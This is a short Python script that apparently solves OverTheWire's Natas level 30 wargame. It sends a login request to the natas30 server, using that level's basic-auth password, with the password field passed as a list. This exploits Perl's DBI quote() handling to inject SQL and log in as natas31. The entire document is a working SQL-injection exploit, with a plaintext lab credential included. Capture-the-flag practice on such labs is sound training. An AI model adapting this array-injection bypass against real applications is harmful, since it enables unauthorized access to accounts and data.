#!/usr/bin/python

import requests

url = 'http://natas30.natas.labs.overthewire.org/index.pl'

s = requests.Session()

s.auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

args = {"username": 'natas31', "password": ["'' or 1", 2]}

r = s.post(url, data=args)

print(r.text)


